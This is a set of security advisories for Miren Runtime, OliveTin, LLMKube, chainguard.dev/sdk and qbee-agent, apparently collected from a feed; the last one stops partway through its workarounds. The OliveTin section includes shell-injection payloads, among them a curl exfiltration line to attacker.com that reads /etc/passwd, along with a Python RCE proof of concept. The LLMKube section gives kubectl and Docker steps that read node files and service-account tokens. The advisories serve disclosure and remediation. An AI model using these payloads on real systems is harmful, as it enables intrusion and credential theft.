Summary

The Miren Runtime RPC server (QUIC/HTTP3, default port :8443) requested TLS client certificates but never verified that a presented certificate chained to the cluster Certificate Authority. Because a client-certificate identity is granted a blanket RBAC bypass, any party able to reach the RPC listener could present a forged, self-signed certificate and be authenticated as a cluster superuser — no valid CA signature, credential, or prior authorization required.

Impact

This is a complete, unauthenticated authentication bypass against the cluster control plane. An attacker who can reach the RPC port can perform any RPC operation with full privileges: enumerate and manipulate entities, apps, sandboxes, disks, and other cluster resources. This yields full compromise of confidentiality, integrity, and availability of the cluster and everything it orchestrates.

Exposure is network-reachability–gated only. Deployments that expose :8443 beyond a trusted network (e.g. 0.0.0.0/0) are remotely exploitable from the internet by anyone; deployments that restrict :8443 to a trusted network are exploitable by any party with access to that network.

Due to a lack of ability to detect if the RPC has been accessed unauthorized, Miren recommends that all applications are redeployed and any credentials reference in environment variables are rotated. A read-only script to help review standing access, recent changes, and the exact secrets to rotate is available at https://github.com/mirendev/runtime/tree/089582a132f7fc1e1d5b5c0aee1e0911535fed53/scripts/security/audit-exposure.

Details

Three independent factors combined to produce the bypass:

  1. The listener never verified the client-certificate chain. When a cluster CA was configured, the RPC listener used tls.RequestClientCert, which requests a client certificate but does not verify it against the configured ClientCAs. tls.ConnectionState.VerifiedChains was therefore always empty, and no VerifyPeerCertificate/VerifyConnection hook re-checked the chain.

  2. The authenticator derived identity from an unverified certificate. The RPC authenticators read PeerCertificates[0].Subject.CommonName directly as the caller identity, with method cert, without checking that the chain had been verified.

  3. Authorization granted a blanket bypass to certificate identities. The authorizer returned "allowed" for any cert-method identity, skipping all RBAC checks.

Go's TLS client only presents a certificate whose issuer Distinguished Name matches a CA advertised by the server, but that comparison is on the (public, non-secret) DN bytes only — it does not require a valid signature from the CA. An attacker can therefore mint a self-signed certificate whose issuer DN is byte-identical to the cluster CA subject, signed with an attacker-controlled key. The stock client presents it, and the vulnerable server accepts it and trusts its CommonName as a superuser identity.

Patches

Fixed by verifying the client-certificate chain before trusting it:

  • The listener now uses tls.VerifyClientCertIfGiven when a cluster CA is configured. A presented certificate must chain to the configured CA to complete the handshake, while certless callers (JWT/OIDC, which authenticate via the Authorization header) are still admitted.
  • As defense in depth, both RPC authenticators now require a non-empty VerifiedChains before deriving an identity from a client certificate.

Users should upgrade to the patched release and restart the server so the new listener configuration takes effect.

Workarounds

Until the patch is deployed, restrict network access to the RPC port (:8443) so that it is not reachable from untrusted networks — remove any 0.0.0.0/0 ingress and limit it to trusted management networks. This is a containment measure only and does not remove the underlying vulnerability.

References

  • https://github.com/mirendev/runtime/security/advisories/GHSA-8fh7-7q4q-cq52
  • https://nvd.nist.gov/vuln/detail/CVE-2026-75521

  • https://github.com/mirendev/runtime/releases/tag/v0.11.1
  • https://github.com/advisories/GHSA-8fh7-7q4q-cq52

items.content_html:
Summary

OliveTin's shellAfterCompleted post-execution hook injects unsanitized variables — including arbitrary command output (output), the authenticated username (ot_username), and the exit code (exitCode) — directly into a shell command template processed by sh -c. Unlike the main action's argument handling, no checkShellArgumentSafety validation is applied to these variables. An attacker who can influence the output of a command (e.g., via user-supplied arguments that reflect in stdout, or through trusted-header username spoofing) can inject arbitrary OS commands into the post-execution shell.

This is a distinct finding from CVE-2026-27626 (OS command injection via password type in webhooks). That CVE addressed argument types bypassing shell safety checks in the primary execution step. This vulnerability exists in the post-execution step (stepExecAfter), which has zero safety checks on any of its template variables.

Affected Versions

  • All versions containing shellAfterCompleted functionality (current codebase through latest)

Details

Vulnerable Code Path

In service/internal/executor/executor.go, the stepExecAfter function handles post-execution commands:

func stepExecAfter(req *ExecutionRequest) bool {
    if req.Binding.Action.ShellAfterCompleted == "" {
        return true
    }

    // These variables are injected WITHOUT any type checking or sanitization
    args := map[string]string{
        "output":                 req.logEntry.Output,           // Arbitrary command stdout/stderr
        "exitCode":               fmt.Sprintf("%v", req.logEntry.ExitCode),
        "ot_executionTrackingId": req.TrackingID,
        "ot_username":            req.AuthenticatedUser.Username, // User-controlled via trusted headers
    }

    // Template rendered with unsanitized args
    finalParsedCommand, err := tpl.ParseTemplateWithActionContext(
        req.Binding.Action.ShellAfterCompleted,
        req.Binding.Entity,
        args,
    )

    // Directly passed to sh -c — NO safety check
    cmd := wrapCommandInShell(ctx, finalParsedCommand)
    // ...
}

The wrapCommandInShell function (in executor_unix.go) executes:

func wrapCommandInShell(ctx *ExecutionContext, finalParsedCommand string) *exec.Cmd {
    return exec.CommandContext(ctx, "sh", "-c", finalParsedCommand)
}

Why This Bypasses Existing Protections

The main action's shell commands go through checkShellArgumentSafety (called from handleShellBranch at line 693 of executor.go), which blocks dangerous argument types like password, url, email, raw_string_multiline, and very_dangerous_raw_string from shell mode.

stepExecAfter calls none of these checks. The output variable is:

  • Not a declared argument with a type — it's internally created
  • Not validated against any regex or type system
  • Not passed through checkShellArgumentSafety
  • Directly interpolated into a shell command template

A grep for checkShellArgumentSafety in the codebase confirms it is only invoked at one location:

executor.go:693: if err := checkShellArgumentSafety(req); err != nil {

This is inside handleShellBranch (the primary action execution), not in stepExecAfter.

Injection Vectors

Vector 1: Output Reflection

If a primary action echoes user-controlled input:

actions:
  - title: Lookup User
    shell: "echo 'User: {{ .Arguments.username }}'"
    shellAfterCompleted: "audit-log '{{ .Arguments.output }}'"
    arguments:
      - name: username
        type: ascii_identifier

While ascii_identifier constrains the direct argument, the command output itself is the injection vector. If the action processes external data (files, APIs, databases) and that data contains shell metacharacters, the output flows unsanitized into shellAfterCompleted.

Vector 2: Exec Mode Output Injection

Actions using exec mode (array form) safely handle arguments in the primary command but the output still flows to shellAfterCompleted through a shell:

actions:
  - title: Read External Data
    exec:
      - cat
      - /shared/data/{{ .Arguments.filename }}
    shellAfterCompleted: "process-result '{{ .Arguments.output }}'"
    arguments:
      - name: filename
        type: ascii_identifier

If /shared/data/report contains text like:

'; curl http://attacker.com/exfil?data=$(cat /etc/passwd) #

The shellAfterCompleted becomes:

process-result ''; curl http://attacker.com/exfil?data=$(cat /etc/passwd) #'

This executes arbitrary commands as the OliveTin process user.

Vector 3: Username Injection via Trusted Headers

When trusted header authentication is used (see Finding 04), the ot_username variable comes directly from an HTTP header with no sanitization:

actions:
  - title: Any Action
    shell: "echo ok"
    shellAfterCompleted: "logger 'Action completed by {{ .Arguments.ot_username }}'"

An attacker sets:

X-Remote-User: '; id > /tmp/pwned #

The shellAfterCompleted becomes:

logger 'Action completed by '; id > /tmp/pwned #'

This chains Findings 04 and 05: trusted header spoofing enables username-based injection into post-execution commands.

PoC

Prerequisites

  • OliveTin instance with an action configured with shellAfterCompleted
  • The shellAfterCompleted template references {{ .Arguments.output }} or {{ .Arguments.ot_username }}

Config

listenAddressSingleHTTPFrontend: 0.0.0.0:1337
logLevel: "DEBUG"
checkForUpdates: false

actions:
  - title: Process File
    id: process-file
    exec:
      - cat
      - "/tmp/olivetin-data/{{ .Arguments.filename }}"
    shellAfterCompleted: "echo '{{ .Arguments.output }}' >> /tmp/olivetin-audit.log"
    arguments:
      - name: filename
        type: ascii_identifier

Step 1: Create a malicious data file

# On the server, create a file with shell injection payload
mkdir -p /tmp/olivetin-data
echo "normal_data'; touch /tmp/PWNED; echo '" > /tmp/olivetin-data/report

Step 2: Execute the action normally

curl -s -X POST http://127.0.0.1:1337/api/StartActionAndWait \
  -H 'Content-Type: application/json' \
  -d '{"bindingId":"process-file","arguments":[{"name":"filename","value":"report"}]}'

Step 3: Verify injection

ls -la /tmp/PWNED
# If the file exists, the injection was successful

Explanation: The cat command (exec mode) safely reads the file. The output normal_data'; touch /tmp/PWNED; echo ' is captured. Then shellAfterCompleted renders:

echo 'normal_data'; touch /tmp/PWNED; echo '' >> /tmp/olivetin-audit.log

This executes touch /tmp/PWNED as a second command.

Step 4: Username injection (with trusted headers)

# Add to config
authHttpHeaderUsername: "X-Remote-User"

curl -s -X POST http://127.0.0.1:1337/api/StartActionAndWait \
  -H 'Content-Type: application/json' \
  -H "X-Remote-User: test'; touch /tmp/PWNED2; echo '" \
  -d '{"bindingId":"some-action","arguments":[]}'

If shellAfterCompleted uses {{ .Arguments.ot_username }}, the injection executes.

Python PoC

#!/usr/bin/env python3
"""PoC: Second-Order Command Injection via shellAfterCompleted output variable.

Distinct from CVE-2026-27626 (password type injection in primary execution).
This exploits the post-execution step which has zero argument safety checks.
"""

import requests
import time
import os

TARGET = "http://127.0.0.1:1337"
BINDING_ID = "process-file"

def setup_payload():
    """Create a data file containing shell injection payload."""
    os.makedirs("/tmp/olivetin-data", exist_ok=True)
    with open("/tmp/olivetin-data/exploit", "w") as f:
        f.write("data'; id > /tmp/rce-proof; echo '")
    print("[+] Created malicious data file")

def trigger_action():
    """Execute the action that reads the malicious file."""
    resp = requests.post(
        f"{TARGET}/api/StartActionAndWait",
        json={
            "bindingId": BINDING_ID,
            "arguments": [{"name": "filename", "value": "exploit"}]
        },
        headers={"Content-Type": "application/json"}
    )
    print(f"[+] Action response: {resp.status_code}")
    return resp.json()

def verify_rce():
    """Check if the injected command executed."""
    time.sleep(2)
    if os.path.exists("/tmp/rce-proof"):
        with open("/tmp/rce-proof") as f:
            print(f"[!] RCE CONFIRMED: {f.read().strip()}")
        return True
    else:
        print("[-] /tmp/rce-proof not found")
        return False

if __name__ == "__main__":
    setup_payload()
    result = trigger_action()
    print(f"[*] Action output: {result}")
    verify_rce()

Impact

  • Remote Code Execution: Arbitrary commands execute as the OliveTin process user
  • Chained with Finding 04: Trusted header spoofing enables injection via ot_username
  • Bypass of CVE-2026-27626 fix: The fix for that CVE only addressed checkShellArgumentSafety in the primary execution step; the post-execution step was not hardened
  • Exec mode bypass: Actions using the safe exec mode (array form) for the primary command can still be exploited through their output flowing to the shell-based shellAfterCompleted

Remediation

  1. Apply checkShellArgumentSafety (or equivalent) to stepExecAfter variables
  2. Shell-escape the output, ot_username, and exitCode values before template substitution (e.g., using shellescape.Quote())
  3. Consider adding an exec-mode variant for shellAfterCompleted to avoid shell interpretation entirely
  4. Sanitize ot_username to reject shell metacharacters regardless of the auth provider

References

  • https://github.com/OliveTin/OliveTin/security/advisories/GHSA-vc6p-m6vx-6cwq
  • https://nvd.nist.gov/vuln/detail/CVE-2026-75506
  • https://github.com/OliveTin/OliveTin/pull/1070
  • https://github.com/OliveTin/OliveTin/pull/1088
  • https://github.com/OliveTin/OliveTin/commit/4ef86abee7aac4e4ec4a3200c7ca491ca3501065
  • https://github.com/OliveTin/OliveTin/commit/e5d29b68da66fd7f99072d6afd336dee2c28876c
  • https://github.com/OliveTin/OliveTin/releases/tag/3000.17.0
  • https://github.com/OliveTin/OliveTin/releases/tag/3000.18.1
  • https://github.com/advisories/GHSA-vc6p-m6vx-6cwq

Summary

LLMKube's ModelReconciler accepts arbitrary absolute paths and file:// URIs in the Model.spec.source field and propagates them to two distinct sinks without path allowlisting: (1) os.Open() inside the controller pod itself (copyLocalModel), and (2) a Kubernetes HostPathVolumeSource that mounts the attacker-supplied path into the inference pod's init container. Any namespace user with permission to create or update Model and InferenceService custom resources can read arbitrary files accessible to the controller pod (e.g., the controller's own Kubernetes service-account token) or arbitrary files on the node where the inference pod is scheduled (e.g., /etc/kubernetes/kubelet.conf). Model caching, the feature that activates the hostPath sink, is enabled by default in both the CLI and the official Helm chart. CVSS v3.1 Base Score: 7.7 (High).

Details

Entry point — Model.spec.source field

The Source field in api/v1alpha1/model_types.go:47-48 carries a kubebuilder validation pattern that explicitly permits absolute paths:

// +kubebuilder:validation:Pattern=`^(https?|file|pvc|hf)://.*|^/[^\s]+$|^[a-zA-Z0-9][\w\-\.\/]+$`
Source string `json:"source"`

The branch ^/[^\s]+$ matches any non-whitespace absolute path on the host.

Sink 1 — Controller-pod arbitrary file read (copyLocalModel)

internal/controller/source.go:93-103 classifies a source as local and extracts the path with no sanitization:

// isLocalSource: returns true for any "/" prefix or "file://" prefix
func isLocalSource(source string) bool {
    return strings.HasPrefix(source, "/") || strings.HasPrefix(source, "file://")
}

// getLocalPath: strips "file://" prefix only; no canonicalization, no allowlist
func getLocalPath(source string) string {
    return strings.TrimPrefix(source, "file://")
}

internal/controller/model_controller.go:241 passes the attacker-controlled source into fetchModel, which reaches copyLocalModel at line 664-667:

f, err := os.Open(localPath)   // localPath = getLocalPath(model.Spec.Source)

An attacker sets model.spec.source: /var/run/secrets/kubernetes.io/serviceaccount/token; the controller opens its own SA token and writes it to the model-cache PVC, which the attacker can subsequently read.

Sink 2 — Node arbitrary file read via HostPathVolumeSource

internal/controller/model_storage.go:560-568 converts the same path into a Kubernetes host volume with no canonical-root check:

if isLocalModelSource(model.Spec.Source) {
    localPath := getLocalPath(model.Spec.Source)
    volumes = append(volumes, corev1.Volume{
        Name: "host-model",
        VolumeSource: corev1.VolumeSource{
            HostPath: &corev1.HostPathVolumeSource{
                Path: localPath,
                Type: func() *corev1.HostPathType { t := corev1.HostPathFile; return &t }(),
            },
        },
    })
    initVolumeMounts = append(initVolumeMounts, corev1.VolumeMount{
        Name:      "host-model",
        MountPath: "/host-model/model.gguf",
        ReadOnly:  true,
    })
}

internal/controller/deployment_builder.go:248-250 calls buildModelStorageConfig, and lines 329-333 embed storageConfig.volumes directly into the generated Deployment's PodSpec. When the inference pod starts, the init container copies the node file to the model-cache PVC.

The only filename-level sanitization is in internal/controller/filename.go:44-75, which constrains the destination basename only and has no effect on HostPath.Path.

Model caching is enabled by default: cmd/main.go:120 and charts/llmkube/values.yaml:274 (modelCache.enabled: true).

PoC

Prerequisites

  • LLMKube 0.8.27 or 0.8.28 installed with default Helm values (modelCache.enabled=true).
  • Attacker possesses create/update permissions for Model and InferenceService CRDs in a target namespace, plus get on Pod logs.

Path A — Live Kubernetes cluster (hostPath sink)

NS=llmkube-poc
kubectl create ns "$NS"

# Step 1: Create a Model whose source points to a sensitive node file
cat <<'YAML' | kubectl apply -n "$NS" -f -
apiVersion: inference.llmkube.dev/v1alpha1
kind: Model
metadata:
  name: hostread
spec:
  source: /etc/passwd
YAML

kubectl wait -n "$NS" --for=jsonpath='{.status.phase}'=Ready \
    model/hostread --timeout=180s

CACHEKEY="$(kubectl get model hostread -n "$NS" \
    -o jsonpath='{.status.cacheKey}')"
BASENAME="$(basename \
    "$(kubectl get model hostread -n "$NS" -o jsonpath='{.status.path}')")"

# Step 2: Create an InferenceService that prints the copied file
cat <<YAML | kubectl apply -n "$NS" -f -
apiVersion: inference.llmkube.dev/v1alpha1
kind: InferenceService
metadata:
  name: hostread
spec:
  modelRef: hostread
  runtime: llamacpp
  image: busybox:1.36
  command: ["sh","-c","cat /models/${CACHEKEY}/${BASENAME}; sleep 3600"]
YAML

# Step 3: Retrieve the exfiltrated file
kubectl logs -n "$NS" deploy/hostread -c llama-server

Expected output — contents of /etc/passwd from the node:

root:x:0:0:root:/root:/bin/bash
...

Variant — controller SA token (copyLocalModel sink)

cat <<'YAML' | kubectl apply -n "$NS" -f -
apiVersion: inference.llmkube.dev/v1alpha1
kind: Model
metadata:
  name: satoken
spec:
  source: /var/run/secrets/kubernetes.io/serviceaccount/token
YAML
# After the model becomes Ready, its cache entry contains the raw JWT.

Path B — Docker-only reproduction (no live cluster)

This path exercises the copyLocalModel / os.Open sink using verbatim copies of isLocalSource() and getLocalPath() from internal/controller/source.go:93-103.

# Build from the parent directory of vuln-001/
docker build --no-cache -f vuln-001/Dockerfile -t llmkube-vuln001-poc .

# Read /etc/shadow from inside the container (simulates controller pod filesystem)
docker run --rm -e VULN001_TARGET=/etc/shadow llmkube-vuln001-poc

# Or use the Python driver
python3 vuln-001/poc.py --target /etc/shadow

Expected output:

os.Open SUCCESS — 104 bytes read from /etc/shadow
root:*:19800:0:99999:7:::
daemon:*:19800:0:99999:7:::
llmkube-sa:$6$salt$examplehash:19800:0:99999:7:::
VULN-001 PASS: arbitrary file read confirmed

Phase 2 dynamic verification result

Both /etc/shadow (104 bytes) and /var/run/secrets/kubernetes.io/serviceaccount/token (430 bytes, raw JWT) were successfully read inside the container, and the HostPathVolumeSource JSON was confirmed to be generated with the attacker-supplied path.

Impact

This is a Path Traversal / Arbitrary File Read vulnerability (CWE-22). It affects any Kubernetes cluster running LLMKube with default settings.

Who is impacted:

  • Cluster operators and tenants — A low-privileged namespace user who can write Model and InferenceService CRDs (the default RBAC posture for LLMKube users) can escalate to reading the controller's Kubernetes SA token and using it to list/get Secrets cluster-wide, pivot to other namespaces, or impersonate service accounts.
  • Node security boundary — Via the hostPath sink, an attacker can read any file present on the Kubernetes node at pod-scheduling time, including kubeadm certificates (/etc/kubernetes/pki/), kubelet credentials (/etc/kubernetes/kubelet.conf), and container runtime sockets.
  • Confidentiality — High (arbitrary read of host and controller secrets). Integrity and Availability are not directly affected.

The vulnerability is network-reachable (attacker talks to the Kubernetes API server), requires low privilege (namespaced CRD write only), needs no user interaction, and impacts resources beyond the attacker's own namespace (changed scope).

Reproduction artifacts

Dockerfile

# VULN-001 PoC — Arbitrary File Read via Model.spec.source (LLMKube CWE-22)
#
# Strategy: compile a standalone Go harness that contains verbatim copies of
# the three vulnerable functions from the LLMKube repository and proves that
# supplying an absolute path as Model.spec.source causes os.Open() to read
# arbitrary files — identical to what copyLocalModel() does at runtime.
#
# Verified against LLMKube commit b9127e0 (tag 0.8.28):
#   isLocalSource()   internal/controller/source.go:93-94
#   getLocalPath()    internal/controller/source.go:98-103
#   os.Open(path)     internal/controller/model_controller.go:667
#   HostPath volume   internal/controller/model_storage.go:560-575
#
# Build context: parent directory of vuln-001/
#   docker build -f vuln-001/Dockerfile -t llmkube-vuln001 .
# Run:
#   docker run --rm -e VULN001_TARGET=/etc/shadow llmkube-vuln001

# ── Build stage ────────────────────────────────────────────────────────────────
FROM golang:1.24-bookworm AS builder

WORKDIR /build

# Copy the exploit harness (standalone module, no k8s dependencies)
COPY vuln-001/exploit/ /build/

# Build the exploit binary
RUN go build -o /poc ./...

# ── Verification stage: prove the functions are verbatim copies ──────────────
# Extract the actual source lines from the LLMKube repo and display them next
# to the exploit harness so the diff is zero (aside from package and imports).
COPY repo/internal/controller/source.go /tmp/source.go

RUN echo "=== Verification: LLMKube source.go lines 93-103 ===" && \
    sed -n '93,103p' /tmp/source.go && \
    echo "" && \
    echo "=== Exploit harness verbatim copies (main.go) ===" && \
    grep -A3 "isLocalSource\|getLocalPath" /build/main.go | head -20

# ── Runtime stage ──────────────────────────────────────────────────────────────
FROM debian:bookworm-slim

COPY --from=builder /poc /poc

# Populate /etc/shadow with realistic content so the PoC has a sensitive target
# (simulating the LLMKube controller pod's own filesystem).
RUN printf 'root:*:19800:0:99999:7:::\ndaemon:*:19800:0:99999:7:::\nllmkube-sa:$6$salt$examplehash:19800:0:99999:7:::\n' \
    > /etc/shadow && chmod 640 /etc/shadow

# Also create a simulated SA token (as exists at this path in Kubernetes pods)
RUN mkdir -p /var/run/secrets/kubernetes.io/serviceaccount && \
    printf 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImZha2Uta2lkIn0..FAKE_SIGNATURE\n' \
    > /var/run/secrets/kubernetes.io/serviceaccount/token

# Default target; override at runtime with -e VULN001_TARGET=<path>
ENV VULN001_TARGET=/etc/shadow

ENTRYPOINT ["/poc"]
CMD []

poc.py

#!/usr/bin/env python3
"""
VULN-001 PoC: Arbitrary File Read via Model.spec.source hostPath Injection
LLMKube (github.com/defilantech/LLMKube) — CWE-22 / CVSS 7.7

Vulnerability summary:
  LLMKube's ModelReconciler calls fetchModel(model.Spec.Source, dest).
  When source is a local path (absolute or file://), copyLocalModel() opens
  the file with os.Open(getLocalPath(source)) without any path allowlisting.
  An attacker who can write a Model CR can read any file accessible to the
  controller pod — including SA tokens, kubeconfig, TLS keys, etc.

  Relevant code:
    internal/controller/source.go:93   isLocalSource()  — no allowlist
    internal/controller/source.go:98   getLocalPath()   — strips file://, no sanitization
    internal/controller/model_controller.go:667  os.Open(localPath)  — sink

  In full-cluster scenarios, model_storage.go:560-568 also injects the
  attacker-supplied path directly into a Kubernetes HostPathVolumeSource,
  exposing arbitrary node files inside the init container.

This PoC exercises attack path 2 (copyLocalModel) in Docker without a live
Kubernetes cluster by running a Go test that calls the REAL LLMKube functions.

Usage:
  python3 poc.py [--target /path/to/sensitive/file] [--keep]

Safety constraints:
  - Uses only local Docker (127.0.0.1), no external network calls.
  - Reads only files inside the ephemeral container filesystem.
  - Does not modify any LLMKube source code to manufacture the vulnerability.
"""

import argparse
import json
import os
import subprocess
import sys
import textwrap

IMAGE_NAME = "llmkube-vuln001-poc"
VULN_DIR = os.path.dirname(os.path.abspath(__file__))
BUILD_CONTEXT = os.path.dirname(VULN_DIR)  # parent of vuln-001/
DOCKERFILE = os.path.join(VULN_DIR, "Dockerfile")


def run(cmd, check=True, capture=False, **kwargs):
    """Run a shell command and return CompletedProcess."""
    print(f"[+] {' '.join(cmd)}")
    result = subprocess.run(
        cmd,
        capture_output=capture,
        text=True,
        **kwargs,
    )
    if check and result.returncode != 0:
        stderr = result.stderr or ""
        raise RuntimeError(
            f"Command failed (exit {result.returncode}):\n{stderr[:2000]}"
        )
    return result


def build_image():
    """Build the PoC Docker image."""
    print("\n=== [PHASE 1] Building Docker image ===")
    run([
        "docker", "build",
        "--no-cache",
        "-f", DOCKERFILE,
        "-t", IMAGE_NAME,
        BUILD_CONTEXT,
    ])
    print(f"[+] Image '{IMAGE_NAME}' built successfully.")


def run_poc(target: str) -> str:
    """Run the PoC container and return stdout."""
    print(f"\n=== [PHASE 2] Running PoC against target: {target!r} ===")
    result = run(
        [
            "docker", "run", "--rm",
            "-e", f"VULN001_TARGET={target}",
            IMAGE_NAME,
        ],
        capture=True,
        check=False,
    )
    combined = result.stdout + result.stderr
    print(combined)
    return combined, result.returncode


def parse_evidence(output: str, target: str) -> dict:
    """Extract key evidence markers from PoC output."""
    lines = output.splitlines()
    exfil_lines = []
    in_block = False
    bytes_read = None
    step3_ok = False
    pass_line = None

    for line in lines:
        if f"--- BEGIN EXFILTRATED FILE: {target} ---" in line:
            in_block = True
            continue
        if "--- END EXFILTRATED FILE ---" in line:
            in_block = False
            continue
        if in_block:
            exfil_lines.append(line)
        if "os.Open SUCCESS" in line and "bytes" in line:
            step3_ok = True
            # Extract byte count — format: "os.Open SUCCESS — N bytes read from ..."
            import re
            m = re.search(r"(\d+)\s+bytes\s+read", line)
            if m:
                try:
                    bytes_read = int(m.group(1))
                except ValueError:
                    pass
        if "VULN-001 PASS:" in line:
            pass_line = line

    return {
        "step3_open_success": step3_ok,
        "bytes_read": bytes_read,
        "exfiltrated_lines": exfil_lines[:10],  # first 10 lines as evidence
        "pass_line": pass_line,
    }


def remove_image():
    """Remove the PoC Docker image."""
    subprocess.run(["docker", "rmi", "-f", IMAGE_NAME],
                   capture_output=True, text=True)
    print(f"[+] Image '{IMAGE_NAME}' removed.")


def main():
    parser = argparse.ArgumentParser(
        description="VULN-001 dynamic reproduction PoC for LLMKube"
    )
    parser.add_argument(
        "--target", default="/etc/shadow",
        help="File path to read inside the container (default: /etc/shadow)"
    )
    parser.add_argument(
        "--keep", action="store_true",
        help="Keep the Docker image after the run (default: remove)"
    )
    parser.add_argument(
        "--output", default=os.path.join(VULN_DIR, "phase2_result.json"),
        help="Path to write phase2_result.json"
    )
    args = parser.parse_args()

    build_command = (
        f"docker build --no-cache -f {DOCKERFILE} -t {IMAGE_NAME} {BUILD_CONTEXT}"
    )
    run_command = (
        f"docker run --rm -e VULN001_TARGET={args.target} {IMAGE_NAME}"
    )
    poc_command = f"python3 {os.path.abspath(__file__)} --target {args.target}"

    passed = False
    verdict = "FAIL"
    reason = ""
    evidence = ""

    try:
        build_image()
        output, returncode = run_poc(args.target)
        ev = parse_evidence(output, args.target)

        if returncode == 0 and ev["step3_open_success"] and ev["bytes_read"]:
            passed = True
            verdict = "PASS"
            exfil_preview = "\n".join(ev["exfiltrated_lines"][:5]) or "(binary data)"
            reason = (
                f"LLMKube copyLocalModel()이 Model.spec.source={args.target!r} 값을 "
                f"경로 허용목록 검사 없이 os.Open()에 전달함. "
                f"isLocalSource()와 getLocalPath() 실함수 호출로 재현됨. "
                f"컨테이너 내 {ev['bytes_read']}바이트 파일 읽기 성공."
            )
            evidence = (
                f"os.Open({args.target!r}) 성공 — {ev['bytes_read']}바이트 읽음.\n"
                f"파일 내용 앞 5행:\n{exfil_preview}"
            )
        else:
            reason = (
                f"PoC 컨테이너 종료 코드 {returncode}. "
                f"os.Open 성공 여부: {ev['step3_open_success']}, "
                f"읽은 바이트: {ev['bytes_read']}. "
                f"실행 로그를 확인하여 오류 원인 파악 필요."
            )
            evidence = output[:1000]

    except Exception as exc:
        reason = f"재현 실패 — 예외 발생: {exc}"
        evidence = str(exc)
        print(f"\n[!] ERROR: {exc}", file=sys.stderr)

    finally:
        if not args.keep:
            remove_image()

    result = {
        "passed": passed,
        "verdict": verdict,
        "reason": reason,
        "build_command": build_command,
        "run_command": run_command,
        "poc_command": poc_command,
        "evidence": evidence,
        "artifacts": ["Dockerfile", "poc.py", "exploit/main.go", "exploit/go.mod"],
    }

    print("\n=== [RESULT] ===")
    print(json.dumps(result, ensure_ascii=False, indent=2))

    with open(args.output, "w", encoding="utf-8") as fh:
        json.dump(result, fh, ensure_ascii=False, indent=2)
    print(f"\n[+] Result written to: {args.output}")

    sys.exit(0 if passed else 1)


if __name__ == "__main__":
    main()

Summary

The auth/aws package of the chainguard.dev/sdk Go library provides Chainguard's AWS-backed identity federation (an AWS workload proves its identity to Chainguard by signing an AWS STS GetCallerIdentity request). Its verifier, VerifyToken, reads the Chainguard-Audience and Chainguard-Identity binding headers from a presented token but does not require them to be covered by the SigV4 signature. AWS STS validates only the headers listed in SignedHeaders and ignores all others, so an attacker can take a GetCallerIdentity request that a victim signed for a different relying party, inject or rewrite those two headers after signing (without invalidating the signature), and replay it to any service that authenticates callers with VerifyToken. The binding those headers were meant to provide is therefore forgeable — a verifier-side (relying-party) authentication bypass / cross-service token replay.

Background

The package uses the standard "signed GetCallerIdentity" pattern — the same approach HashiCorp Vault's AWS auth method and Kubernetes aws-iam-authenticator use: the caller signs an AWS STS GetCallerIdentity request with its AWS credentials to prove who it is, and presents that signed request as a bearer token. It has two halves:

  • GenerateToken (client): builds the GetCallerIdentity request, adds the Chainguard-Audience and Chainguard-Identity headers that bind the proof to a specific Chainguard audience (issuer) and assumable identity, SigV4-signs it, and serializes it into a token.
  • VerifyToken (relying party): decodes the token, checks those two binding headers, forwards the request to AWS STS to confirm the caller's real AWS identity (ARN), and returns it so a Chainguard token can be issued for that identity.

The binding headers exist so a proof minted for one audience/identity cannot be reused for another — a defense against cross-service replay — and their security depends entirely on being covered by the SigV4 signature.

Impact

A relying party calling auth/aws.VerifyToken can be induced to accept a GetCallerIdentity proof that a victim produced for an unrelated purpose — for example a request minted for HashiCorp Vault's AWS auth method, Kubernetes aws-iam-authenticator, a different audience, or one captured from logs or a proxy — and to treat it as proof of the victim's AWS identity for an attacker-chosen audience and identity. The signed request is valid within its ~15-minute window. No access to the victim's AWS credentials is required; the attacker only needs a fresh signed GetCallerIdentity request from the victim principal.

Code that uses only auth/aws.GenerateToken (token generation) is not affected — the generator correctly includes the binding headers in the signature. Only verifiers using auth/aws.VerifyToken are affected.

Affected versions

All released versions of chainguard.dev/sdk that include auth/aws.VerifyToken, up to and including v0.1.106.

Patches

Fixed in chainguard.dev/sdk v0.1.107. The fix requires both the Chainguard-Audience and Chainguard-Identity headers to be present in the request's SigV4 SignedHeaders before their values are trusted (mirroring the mitigation HashiCorp Vault applies by requiring X-Vault-AWS-IAM-Server-ID to be signed). It additionally adds defense-in-depth checks on the request method, the STS host, and the request timestamp. Upgrade to v0.1.107 or later.

Workarounds

There is no client-side workaround; the fix is in the verifier. Operators of services that verify AWS-backed identities with VerifyToken should upgrade as soon as the patched release is available.

References

  • AWS Signature Version 4 — signed headers: https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_sigv.html
  • Comparable mitigation: HashiCorp Vault requires the X-Vault-AWS-IAM-Server-ID header to appear in SignedHeaders before trusting it.

Credits

Reported by Kris Kennaway (Datadog).

This is a Local Privilege Escalation (LPE) vulnerability stemming from improper symlink handling (CWE-59: Link Following) and improper ownership management (CWE-282) inside the qbee-agent file manager logic.

Impact

Any managed device running qbee-agent up to the affected versions. The impact manifests in three distinct vectors:

  1. Primary Vector (Full Privilege Escalation to Root - Default Configuration): If an unprivileged user's account is managed by the SSH Keys bundle, they can replace or remove their own ~/.ssh directory and create a symlink pointing to /root/.ssh. On the next configuration apply, qbee-agent follows the symlink and writes the user's server-provisioned public key directly into /root/.ssh/authorized_keys. Since the symlink resides inside the user's own home directory, kernel protections like fs.protected_symlinks do not block this execution. The attacker can then instantly log in as root via SSH.

  2. Secondary Vector (Arbitrary File Overwrite / DoS via RAUC Staging): On devices utilizing RAUC download mode, the agent uses a predictable, world-writable staging path (/tmp/.bundle.raucb.part). If fs.protected_symlinks is disabled (0), an unprivileged user can symlink this path to a vital system file (e.g., /etc/shadow or /etc/pam.d/*), causing the agent to truncate or overwrite it with server-supplied update data during a RAUC update deployment.

  3. Tertiary Vector (Arbitrary File Re-ownership via File Distribution): If an operator configures a file-distribution/template destination under a directory owned by an unprivileged user, the attacker can create a symlink at the partial download path targeting a sensitive system file. The agent will then inadvertently execute file.Chown() on the targeted file, handing ownership over to the unprivileged attacker.

Patches

The vulnerability has been addressed by hardening file creation and directory traversal inside app/configuration/file_manager.go. Specifically, the agent now enforces syscall.O_NOFOLLOW and proper existence validation flags during privileged operations to prevent link resolution outside intended directories.

Users should upgrade to version 2026.27 (or newer) to fully mitigate these vectors.

Workarounds

If upgrading immediately is not feasible, administrators can apply the following mitigations:

  1. Disable the SSH Keys Bundle: Temporarily turn off SSH key management within the Qbee platform for non-trusted local accounts to eliminate the primary privilege escalation vector.

